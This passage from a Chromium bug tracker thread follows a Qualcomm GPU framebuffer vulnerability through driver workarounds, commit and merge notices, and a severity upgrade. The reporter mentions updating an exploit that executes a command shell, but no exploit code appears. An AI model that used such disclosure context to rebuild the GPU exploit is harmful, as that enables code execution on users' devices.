gl.deleteFramebuffer(framebuffers[1]);
framebuffers[1] = gl.createFramebuffer();
gl.bindFramebuffer(gl.FRAMEBUFFER, framebuffers[1]);
gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, null, 0);
gl.framebufferRenderbuffer(gl.FRAMEBUFFER, gl.STENCIL_ATTACHMENT, gl.RENDERBUFFER, renderbuffers[0]); 


Thanks,
Mukesh

### ha...@gmail.com (2026-04-14)

Thanks for the explain,Mukesh!Could the developers change this status to fixed?

### ha...@gmail.com (2026-04-16)

deleted

### kb...@google.com (2026-04-25)

Mukesh - coming back around to this bug, that workaround is not workable - constantly re-creating framebuffer objects is prohibitively expensive.

Is the workaround geofflang@ added in <https://crrev.com/c/7533383> applicable here? Is binding an incomplete framebuffer the most problematic case?

If not - can the framebuffer re-creation be done in more limited situations? For example, only if something like `gl.fenceSync(gl.SYNC_GPU_COMMANDS_COMPLETE, 0);` is done inside a BeginQuery/EndQuery pair?

### ha...@gmail.com (2026-04-30)

In order to meet this requirement `prove code execution by executing a command shell with the credentials of the user running Chrome`, I re-recorded the exploit video, updated the exp, and now can execute any code without restrictions

### dx...@google.com (2026-05-07)

Project: angle/angle  

Branch:  main  

Author:  Ken Russell [kbr@chromium.org](mailto:kbr@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7815775>

GL: Add recreateFboUponFlush workaround.

---


Expand for full commit details
```
     
    For the moment, apply it to all Qualcomm GPUs. The workaround will be 
    restricted further in follow-on commits. 
     
    Pass gl::Context to GLImplFactory::createSync on all backends in order 
    to provide it to the GL backend for the workaround. 
     
    Fixed lurking problem with escape sequences in angle_format.py. 
     
    Incorporated new unit tests, including some which force-enable the 
    workaround; should be a no-op on other platforms. 
     
    Co-authored with jetski-cli. 
     
    Bug: chromium:493747593 
    Change-Id: I027bfb484611a89615620001f160d0c909a7b22f 
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/7815775 
    Reviewed-by: Geoff Lang <geofflang@chromium.org> 
    Commit-Queue: Kenneth Russell <kbr@chromium.org>

```

---

Files:

- M `include/platform/autogen/FeaturesGL_autogen.h`
- M `include/platform/gl_features.json`
- M `scripts/code_generation_hashes/ANGLE_format.json`
- M `scripts/code_generation_hashes/ANGLE_load_functions_table.json`
- M `scripts/code_generation_hashes/D3D11_format.json`
- M `scripts/code_generation_hashes/DXGI_format.json`
- M `scripts/code_generation_hashes/GL_copy_conversion_table.json`
- M `scripts/code_generation_hashes/GL_format_map.json`
- M `scripts/code_generation_hashes/Metal_default_shaders.json`
- M `scripts/code_generation_hashes/Metal_format_table.json`
- M `scripts/code_generation_hashes/OpenGL_dispatch_table.json`
- M `scripts/code_generation_hashes/Vulkan_format.json`
- M `scripts/code_generation_hashes/Vulkan_mandatory_format_support_table.json`
- M `scripts/code_generation_hashes/WebGPU_format.json`
- M `src/libANGLE/Context.cpp`
- M `src/libANGLE/Fence.cpp`
- M `src/libANGLE/Fence.h`
- M `src/libANGLE/Fence_unittest.cpp`
- M `src/libANGLE/ResourceManager.cpp`
- M `src/libANGLE/ResourceManager.h`
- M `src/libANGLE/renderer/GLImplFactory.h`
- M `src/libANGLE/renderer/angle_format.py`
- M `src/libANGLE/renderer/d3d/d3d11/Context11.cpp`
- M `src/libANGLE/renderer/d3d/d3d11/Context11.h`
- M `src/libANGLE/renderer/d3d/d3d9/Context9.cpp`
- M `src/libANGLE/renderer/d3d/d3d9/Context9.h`
- M `src/libANGLE/renderer/gl/ContextGL.cpp`
- M `src/libANGLE/renderer/gl/ContextGL.h`
- M `src/libANGLE/renderer/gl/FramebufferGL.cpp`
- M `src/libANGLE/renderer/gl/FramebufferGL.h`
- M `src/libANGLE/renderer/gl/renderergl_utils.cpp`
- M `src/libANGLE/renderer/metal/ContextMtl.h`
- M `src/libANGLE/renderer/metal/ContextMtl.mm`
- M `src/libANGLE/renderer/null/ContextNULL.cpp`
- M `src/libANGLE/renderer/null/ContextNULL.h`
- M `src/libANGLE/renderer/vulkan/ContextVk.cpp`
- M `src/libANGLE/renderer/vulkan/ContextVk.h`
- M `src/libANGLE/renderer/wgpu/ContextWgpu.cpp`
- M `src/libANGLE/renderer/wgpu/ContextWgpu.h`
- M `src/tests/angle_unittests_utils.h`
- M `src/tests/gl_tests/FramebufferTest.cpp`
- M `util/autogen/angle_features_autogen.cpp`
- M `util/autogen/angle_features_autogen.h`

---

Hash: [7193b3e1cdcd67d5ec22274856160f5b363db5fd](https://chromiumdash.appspot.com/commit/7193b3e1cdcd67d5ec22274856160f5b363db5fd)  

Date: Tue May 5 05:57:25 2026


---

### dx...@google.com (2026-05-07)

Project: chromium/src  

Branch:  main  

Author:  [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com) [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:    <https://chromium-review.googlesource.com/7824855>

Roll ANGLE from 75878db047a9 to 95d16933d919 (7 revisions)

---


Expand for full commit details
```
     
    https://chromium.googlesource.com/angle/angle.git/+log/75878db047a9..95d16933d919 
     
    2026-05-07 amaiorano@google.com Vulkan: fix potential OOB read in reformatStagedBufferUpdates 
    2026-05-07 yuxinhu@google.com Skip BasicCopyTextureTest.SelfCopyOOBWrite*GLES on Pixel 10 
    2026-05-07 bsheedy@chromium.org Remove win-perf builders 
    2026-05-07 kbr@chromium.org GL: Add recreateFboUponFlush workaround. 
    2026-05-07 m.maiya@samsung.com Skip trex_200 on S24 bot 
    2026-05-06 yuxinhu@google.com Skip AttachToMultipleCubeFacesThenMSRTT tests on Pixel 10 
    2026-05-06 syoussefi@chromium.org Vulkan: Re-enable dynamic state on JM Mali on r51+ 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/angle-chromium-autoroll 
    Please CC angle-team@google.com,yuxinhu@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To file a bug in ANGLE: https://bugs.chromium.org/p/angleproject/issues/entry 
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Cq-Include-Trybots: luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:gpu-fyi-cq-mac-arm64;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:linux-swangle-try-x64;luci.chromium.try:win-swangle-try-x86 
    Bug: chromium:493747593 
    Tbr: yuxinhu@google.com 
    Change-Id: Iabaa98446cf3a5185c4a00418f18d08e2a1861f2 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7824855 
    Bot-Commit: chromium-autoroll@skia-public.iam.gserviceaccount.com <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Commit-Queue: chromium-autoroll@skia-public.iam.gserviceaccount.com <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1626690}

```

---

Files:

- M `DEPS`
- M `third_party/angle`

---

Hash: [4efaf2f0c53e438d72fc86df862faefb5991e105](https://chromiumdash.appspot.com/commit/4efaf2f0c53e438d72fc86df862faefb5991e105)  

Date: Thu May 7 03:33:42 2026


---

### dx...@google.com (2026-05-08)

Project: angle/angle  

Branch:  main  

Author:  Kenneth Russell [kbr@chromium.org](mailto:kbr@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7829390>

Restrict recreateFboUponFlush workaround.

---


Expand for full commit details
```
     
    Only needed for Qualcomm driver versions less than 878. 
     
    Bug: chromium:493747593 
    Change-Id: I21966357d803172329aa87510ca1c2aec5d91926 
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/7829390 
    Auto-Submit: Kenneth Russell <kbr@chromium.org> 
    Reviewed-by: Geoff Lang <geofflang@chromium.org> 
    Commit-Queue: Geoff Lang <geofflang@chromium.org>

```

---

Files:

- M `src/libANGLE/renderer/gl/renderergl_utils.cpp`

---

Hash: [1c82d73dfdb452d458c76b72c0f45b0461eaba3b](https://chromiumdash.appspot.com/commit/1c82d73dfdb452d458c76b72c0f45b0461eaba3b)  

Date: Fri May 8 00:03:51 2026


---

### dx...@google.com (2026-05-08)

Project: chromium/src  

Branch:  main  

Author:  [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com) [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:    <https://chromium-review.googlesource.com/7832928>

Roll ANGLE from bc0ed8e1c2fa to 1c82d73dfdb4 (1 revision)

---


Expand for full commit details
```
     
    https://chromium.googlesource.com/angle/angle.git/+log/bc0ed8e1c2fa..1c82d73dfdb4 
     
    2026-05-08 kbr@chromium.org Restrict recreateFboUponFlush workaround. 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/angle-chromium-autoroll 
    Please CC angle-team@google.com,yuxinhu@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To file a bug in ANGLE: https://bugs.chromium.org/p/angleproject/issues/entry 
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Cq-Include-Trybots: luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:gpu-fyi-cq-mac-arm64;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:linux-swangle-try-x64;luci.chromium.try:win-swangle-try-x86 
    Bug: chromium:493747593 
    Tbr: yuxinhu@google.com 
    Change-Id: I771f3ca09188eb1de093a888906d3d5311e01adf 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7832928 
    Bot-Commit: chromium-autoroll@skia-public.iam.gserviceaccount.com <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Commit-Queue: chromium-autoroll@skia-public.iam.gserviceaccount.com <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1627684}

```

---

Files:

- M `DEPS`
- M `third_party/angle`

---

Hash: [a1ffbbd4a389e1e25f4bc1c9d15ffdf7a21a2187](https://chromiumdash.appspot.com/commit/a1ffbbd4a389e1e25f4bc1c9d15ffdf7a21a2187)  

Date: Fri May 8 15:57:21 2026


---

### dx...@google.com (2026-05-08)

Project: angle/angle  

Branch:  main  

Author:  Shahbaz Youssefi [syoussefi@chromium.org](mailto:syoussefi@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7831090>

Update test to match ANGLE's style

---


Expand for full commit details
```
     
    Bug: chromium:493747593 
    Change-Id: Ie115d3e2c87a123bc6db6c66e197589f4eccdfa3 
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/7831090 
    Commit-Queue: Shahbaz Youssefi <syoussefi@chromium.org> 
    Reviewed-by: Kenneth Russell <kbr@chromium.org>

```

---

Files:

- M `src/tests/gl_tests/FramebufferTest.cpp`

---

Hash: [f152f768c615069e439af9c2c63702f559c68277](https://chromiumdash.appspot.com/commit/f152f768c615069e439af9c2c63702f559c68277)  

Date: Fri May 8 16:14:31 2026


---

### dx...@google.com (2026-05-08)

Project: chromium/src  

Branch:  main  

Author:  [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com) [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:    <https://chromium-review.googlesource.com/7833630>

Roll ANGLE from 502b6b186f86 to 9778cc0adfd8 (3 revisions)

---


Expand for full commit details
```
     
    https://chromium.googlesource.com/angle/angle.git/+log/502b6b186f86..9778cc0adfd8 
     
    2026-05-08 cclao@google.com Vulkan: Fix bug with framebuffer layer change without rebind 
    2026-05-08 syoussefi@chromium.org Update test to match ANGLE's style 
    2026-05-08 angle-autoroll@skia-public.iam.gserviceaccount.com Manual roll Chromium from 19bd71e8d112 to 7d34a38cf72c (905 revisions) 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/angle-chromium-autoroll 
    Please CC angle-team@google.com,yuxinhu@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To file a bug in ANGLE: https://bugs.chromium.org/p/angleproject/issues/entry 
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Cq-Include-Trybots: luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:gpu-fyi-cq-mac-arm64;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:linux-swangle-try-x64;luci.chromium.try:win-swangle-try-x86 
    Bug: chromium:493747593 
    Tbr: yuxinhu@google.com 
    Change-Id: I22925cf2ebb50fb0a5a3bbce08c9cb68e2b098f8 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7833630 
    Commit-Queue: chromium-autoroll@skia-public.iam.gserviceaccount.com <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Bot-Commit: chromium-autoroll@skia-public.iam.gserviceaccount.com <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1628018}

```

---

Files:

- M `DEPS`
- M `third_party/angle`

---

Hash: [bf653af63d506241f060baaf63b3abb684c52865](https://chromiumdash.appspot.com/commit/bf653af63d506241f060baaf63b3abb684c52865)  

Date: Fri May 8 23:46:23 2026


---

### dx...@google.com (2026-05-10)

Project: angle/angle  

Branch:  main  

Author:  Kenneth Russell [kbr@chromium.org](mailto:kbr@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7833756>

Add !isMesa to recreateFboUponFlush workaround.

---


Expand for full commit details
```
     
    Bug: chromium:493747593 
    Change-Id: Id783c217202a2844294cc5790a8dd46be2bf2c36 
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/7833756 
    Auto-Submit: Kenneth Russell <kbr@chromium.org> 
    Commit-Queue: Shahbaz Youssefi <syoussefi@chromium.org> 
    Reviewed-by: Shahbaz Youssefi <syoussefi@chromium.org>

```

---

Files:

- M `src/libANGLE/renderer/gl/renderergl_utils.cpp`

---

Hash: [2d8f36f37859c65db990c685e57f88a16578c473](https://chromiumdash.appspot.com/commit/2d8f36f37859c65db990c685e57f88a16578c473)  

Date: Sat May 9 16:34:35 2026


---

### dx...@google.com (2026-05-10)

Project: chromium/src  

Branch:  main  

Author:  [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com) [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:    <https://chromium-review.googlesource.com/7835646>

Roll ANGLE from 6f0b04ba184b to 2d8f36f37859 (1 revision)

---


Expand for full commit details
```
     
    https://chromium.googlesource.com/angle/angle.git/+log/6f0b04ba184b..2d8f36f37859 
     
    2026-05-10 kbr@chromium.org Add !isMesa to recreateFboUponFlush workaround. 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/angle-chromium-autoroll 
    Please CC angle-team@google.com,yuxinhu@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To file a bug in ANGLE: https://bugs.chromium.org/p/angleproject/issues/entry 
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Cq-Include-Trybots: luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:gpu-fyi-cq-mac-arm64;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:linux-swangle-try-x64;luci.chromium.try:win-swangle-try-x86 
    Bug: chromium:493747593 
    Tbr: yuxinhu@google.com 
    Change-Id: I3c010b8053a345bee050d3b1363133844306c8d2 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7835646 
    Commit-Queue: chromium-autoroll@skia-public.iam.gserviceaccount.com <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Bot-Commit: chromium-autoroll@skia-public.iam.gserviceaccount.com <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1628295}

```

---

Files:

- M `DEPS`
- M `third_party/angle`

---

Hash: [e7dbd8fd8d2372191f7b3b42f6ce15d726138f71](https://chromiumdash.appspot.com/commit/e7dbd8fd8d2372191f7b3b42f6ce15d726138f71)  

Date: Sun May 10 19:17:24 2026


---

### dx...@google.com (2026-05-12)

Project: chromium/src  

Branch:  main  

Author:  Ken Russell [kbr@chromium.org](mailto:kbr@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7815561>

Add recreate\_fbo\_upon\_flush workaround.

---


Expand for full commit details
```
     
    Apply it to Qualcomm GPUs with driver version less than 878. 
     
    Incorporate test case from the bug report. 
     
    Co-authored with jetski-cli. 
     
    Bug: 493747593 
    Change-Id: I2283a6a908e0ca7ea6eb659178691705d3e5d9f6 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7815561 
    Commit-Queue: Kenneth Russell <kbr@chromium.org> 
    Reviewed-by: Shrek Shao <shrekshao@google.com> 
    Reviewed-by: Loko Kung <lokokung@google.com> 
    Reviewed-by: Geoff Lang <geofflang@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1629021}

```

---

Files:

- M `gpu/command_buffer/service/framebuffer_manager.cc`
- M `gpu/command_buffer/service/framebuffer_manager.h`
- M `gpu/command_buffer/service/gles2_cmd_decoder.cc`
- M `gpu/config/gpu_driver_bug_list.json`
- M `gpu/config/gpu_workaround_list.txt`

---

Hash: [1c744a8beae0107452e9911b845e899c59c81533](https://chromiumdash.appspot.com/commit/1c744a8beae0107452e9911b845e899c59c81533)  

Date: Tue May 12 03:16:49 2026


---

### kb...@google.com (2026-05-15)

Submitter: would you please help me verify the workarounds which were landed? I was able to partially verify them on similar devices with Qualcomm GPUs, but need your help to make sure they address all of the cases on your hardware.

### ch...@google.com (2026-05-15)

**M148** merge request created. **Please update [crbug/513686625](https://crbug.com/513686625) to have this merge reviewed.**

### ch...@google.com (2026-05-15)

**M149** merge request created. **Please update [crbug/513686013](https://crbug.com/513686013) to have this merge reviewed.**

### ha...@gmail.com (2026-05-15)

Sure, have you released a Chrome version of merge? I can download it to verify it.

### kb...@google.com (2026-05-16)

The last of these patches landed in Chrome Canary 150.0.7837.0 (see [this link](https://chromiumdash.appspot.com/commit/1c744a8beae0107452e9911b845e899c59c81533)). Current Canary on the Play Store is 150.0.7842.0, so it contains all of them. It's necessary to go to `about:flags`, change the Passthrough command decoder setting to both "Enabled" and "Disabled", and test both configurations. Thanks.

### ha...@gmail.com (2026-05-16)

This vulnerability appears to be impossible to reproduce now.

### kb...@chromium.org (2026-05-18)

Thank you for confirming.

### kb...@chromium.org (2026-05-20)

Discussing with the security team, this should have been evaluated as higher severity. Upgrading to P0/S0.

### dx...@google.com (2026-05-20)

Project: chromium/src  

Branch:  refs/branch-heads/7827  

Author:  Kenneth Russell [kbr@chromium.org](mailto:kbr@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7861524>

[M149] Add recreate\_fbo\_upon\_flush workaround.

---


Expand for full commit details
```
     
    Back-merge of https://crrev.com/c/7815561 . 
     
    Apply it to Qualcomm GPUs with driver version less than 878. 
     
    Incorporate test case from the bug report. 
     
    Co-authored with jetski-cli. 
     
    Bug: 493747593 
    Bug: 513686013 
    Change-Id: Ia2c1d30dde316fc643fdd8134f6784f38f005fdf 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7861524 
    Commit-Queue: Kenneth Russell <kbr@chromium.org> 
    Auto-Submit: Kenneth Russell <kbr@chromium.org> 
    Reviewed-by: Loko Kung <lokokung@google.com> 
    Cr-Commit-Position: refs/branch-heads/7827@{#1214} 
    Cr-Branched-From: 9f3e9aaccba63bd2ec30334e45e0bfd07ebcc8f1-refs/heads/main@{#1625079}

```

---

Files:

- M `gpu/command_buffer/service/framebuffer_manager.cc`
- M `gpu/command_buffer/service/framebuffer_manager.h`
- M `gpu/command_buffer/service/gles2_cmd_decoder.cc`
- M `gpu/config/gpu_driver_bug_list.json`
- M `gpu/config/gpu_workaround_list.txt`

---

Hash: [2facad56d078fa63891b995f2f023a2d40881d7f](https://chromiumdash.appspot.com/commit/2facad56d078fa63891b995f2f023a2d40881d7f)  

Date: Wed May 20 02:47:59 2026


---

### ha...@gmail.com (2026-05-20)

update exploit diff

### dx...@google.com (2026-05-20)

Project: angle/angle  

Branch:  chromium/7827  

Author:  Ken Russell [kbr@chromium.org](mailto:kbr@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7860432>

[M149] GL: Add recreateFboUponFlush workaround.

---


Expand for full commit details
```
     
    Apply it to Qualcomm driver versions less than 878. 
     
    Pass gl::Context to GLImplFactory::createSync on all backends in order 
    to provide it to the GL backend for the workaround. 
     
    Fixed lurking problem with escape sequences in angle_format.py. 
     
    Incorporated new unit tests, including some which force-enable the 
    workaround; should be a no-op on other platforms. 
     
    Co-authored with jetski-cli. 
     
    Bug: chromium:493747593 
    Bug: chromium:513686013 
    Change-Id: I33221b8e67a49116f6b7c916dcf277824ece2e4d 
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/7860432 
    Reviewed-by: Shahbaz Youssefi <syoussefi@chromium.org>

```

---

Files:

- M `include/platform/autogen/FeaturesGL_autogen.h`
- M `include/platform/gl_features.json`
- M `scripts/code_generation_hashes/ANGLE_format.json`
- M `scripts/code_generation_hashes/ANGLE_load_functions_table.json`
- M `scripts/code_generation_hashes/D3D11_format.json`
- M `scripts/code_generation_hashes/DXGI_format.json`
- M `scripts/code_generation_hashes/GL_copy_conversion_table.json`
- M `scripts/code_generation_hashes/GL_format_map.json`
- M `scripts/code_generation_hashes/Metal_default_shaders.json`
- M `scripts/code_generation_hashes/Metal_format_table.json`
- M `scripts/code_generation_hashes/OpenGL_dispatch_table.json`
- M `scripts/code_generation_hashes/Vulkan_format.json`
- M `scripts/code_generation_hashes/Vulkan_mandatory_format_support_table.json`
- M `scripts/code_generation_hashes/WebGPU_format.json`
- M `src/libANGLE/Context.cpp`
- M `src/libANGLE/Fence.cpp`
- M `src/libANGLE/Fence.h`
- M `src/libANGLE/Fence_unittest.cpp`
- M `src/libANGLE/ResourceManager.cpp`
- M `src/libANGLE/ResourceManager.h`
- M `src/libANGLE/renderer/GLImplFactory.h`
- M `src/libANGLE/renderer/angle_format.py`
- M `src/libANGLE/renderer/d3d/d3d11/Context11.cpp`
- M `src/libANGLE/renderer/d3d/d3d11/Context11.h`
- M `src/libANGLE/renderer/d3d/d3d9/Context9.cpp`
- M `src/libANGLE/renderer/d3d/d3d9/Context9.h`
- M `src/libANGLE/renderer/gl/ContextGL.cpp`
- M `src/libANGLE/renderer/gl/ContextGL.h`
- M `src/libANGLE/renderer/gl/FramebufferGL.cpp`
- M `src/libANGLE/renderer/gl/FramebufferGL.h`
- M `src/libANGLE/renderer/gl/renderergl_utils.cpp`
- M `src/libANGLE/renderer/metal/ContextMtl.h`
- M `src/libANGLE/renderer/metal/ContextMtl.mm`
- M `src/libANGLE/renderer/null/ContextNULL.cpp`
- M `src/libANGLE/renderer/null/ContextNULL.h`
- M `src/libANGLE/renderer/vulkan/ContextVk.cpp`
- M `src/libANGLE/renderer/vulkan/ContextVk.h`
- M `src/libANGLE/renderer/wgpu/ContextWgpu.cpp`
- M `src/libANGLE/renderer/wgpu/ContextWgpu.h`
- M `src/tests/angle_unittests_utils.h`
- M `src/tests/gl_tests/FramebufferTest.cpp`
- M `util/autogen/angle_features_autogen.cpp`
- M `util/autogen/angle_features_autogen.h`

---

Hash: [690ad337619ff76b73421317bccae3f22f9c1e02](https://chromiumdash.appspot.com/commit/690ad337619ff76b73421317bccae3f22f9c1e02)  

Date: Tue May 5 05:57:25 2026


---

### dx...@google.com (2026-05-20)

Project: angle/angle  

Branch:  chromium/7778  

Author:  Ken Russell [kbr@chromium.org](mailto:kbr@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7861545>

[M148] GL: Add recreateFboUponFlush workaround.

---


Expand for full commit details
```
     
    Apply it to Qualcomm driver versions less than 878. 
     
    Pass gl::Context to GLImplFactory::createSync on all backends in order 
    to provide it to the GL backend for the workaround. 
     
    Fixed lurking problem with escape sequences in angle_format.py. 
     
    Incorporated new unit tests, including some which force-enable the 
    workaround; should be a no-op on other platforms. 
     
    Co-authored with jetski-cli. 
     
    Bug: chromium:493747593 
    Bug: chromium:513686625 
    Change-Id: Ia062903d70734d304cbff8013876d4ddf6c5e639 
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/7861545 
    Reviewed-by: Shahbaz Youssefi <syoussefi@chromium.org>

```

---

Files:

- M `include/platform/autogen/FeaturesGL_autogen.h`
- M `include/platform/gl_features.json`
- M `scripts/code_generation_hashes/ANGLE_format.json`
- M `scripts/code_generation_hashes/ANGLE_load_functions_table.json`
- M `scripts/code_generation_hashes/D3D11_format.json`
- M `scripts/code_generation_hashes/DXGI_format.json`
- M `scripts/code_generation_hashes/GL_copy_conversion_table.json`
- M `scripts/code_generation_hashes/GL_format_map.json`
- M `scripts/code_generation_hashes/Metal_default_shaders.json`
- M `scripts/code_generation_hashes/Metal_format_table.json`
- M `scripts/code_generation_hashes/OpenGL_dispatch_table.json`
- M `scripts/code_generation_hashes/Vulkan_format.json`
- M `scripts/code_generation_hashes/Vulkan_mandatory_format_support_table.json`
- M `scripts/code_generation_hashes/WebGPU_format.json`
- M `src/libANGLE/Context.cpp`
- M `src/libANGLE/Fence.cpp`
- M `src/libANGLE/Fence.h`
- M `src/libANGLE/Fence_unittest.cpp`
- M `src/libANGLE/ResourceManager.cpp`
- M `src/libANGLE/ResourceManager.h`
- M `src/libANGLE/renderer/GLImplFactory.h`
- M `src/libANGLE/renderer/angle_format.py`
- M `src/libANGLE/renderer/d3d/d3d11/Context11.cpp`
- M `src/libANGLE/renderer/d3d/d3d11/Context11.h`
- M `src/libANGLE/renderer/d3d/d3d9/Context9.cpp`
- M `src/libANGLE/renderer/d3d/d3d9/Context9.h`
- M `src/libANGLE/renderer/gl/ContextGL.cpp`
- M `src/libANGLE/renderer/gl/ContextGL.h`
- M `src/libANGLE/renderer/gl/FramebufferGL.cpp`
- M `src/libANGLE/renderer/gl/FramebufferGL.h`
- M `src/libANGLE/renderer/gl/renderergl_utils.cpp`
- M `src/libANGLE/renderer/metal/ContextMtl.h`
- M `src/libANGLE/renderer/metal/ContextMtl.mm`
- M `src/libANGLE/renderer/null/ContextNULL.cpp`
- M `src/libANGLE/renderer/null/ContextNULL.h`
- M `src/libANGLE/renderer/vulkan/ContextVk.cpp`
- M `src/libANGLE/renderer/vulkan/ContextVk.h`
- M `src/libANGLE/renderer/wgpu/ContextWgpu.cpp`
- M `src/libANGLE/renderer/wgpu/ContextWgpu.h`
- M `src/tests/angle_unittests_utils.h`
- M `src/tests/gl_tests/FramebufferTest.cpp`
- M `util/autogen/angle_features_autogen.cpp`
- M `util/autogen/angle_features_autogen.h`

---

Hash: [def33282672ba8fb3d2a0c81d76d63adb5c543b1](https://chromiumdash.appspot.com/commit/def33282672ba8fb3d2a0c81d76d63adb5c543b1)  

Date: Tue May 5 05:57:25 2026


---

### dx...@google.com (2026-05-20)

Project: chromium/src  

Branch:  refs/branch-heads/7778  

Author:  Kenneth Russell [kbr@chromium.org](mailto:kbr@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7861505>

[M148] Add recreate\_fbo\_upon\_flush workaround.

---


Expand for full commit details
```
     
    Back-merge of https://crrev.com/c/7815561 . 
     
    Apply it to Qualcomm GPUs with driver version less than 878. 
     
    Incorporate test case from the bug report. 
     
    Co-authored with jetski-cli. 
     
    Bug: 493747593 
    Bug: 513686625 
    Change-Id: Iea4f203b549783d495c600fef77d051e94b08877 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7861505 
    Auto-Submit: Kenneth Russell <kbr@chromium.org> 
    Reviewed-by: Loko Kung <lokokung@google.com> 
    Cr-Commit-Position: refs/branch-heads/7778@{#3322} 
    Cr-Branched-From: 77f495ee216d4c3cc784d33658bad4778c0680ee-refs/heads/main@{#1610480}

```

---

Files:

- M `gpu/command_buffer/service/framebuffer_manager.cc`
- M `gpu/command_buffer/service/framebuffer_manager.h`
- M `gpu/command_buffer/service/gles2_cmd_decoder.cc`
- M `gpu/config/gpu_driver_bug_list.json`
- M `gpu/config/gpu_workaround_list.txt`

---

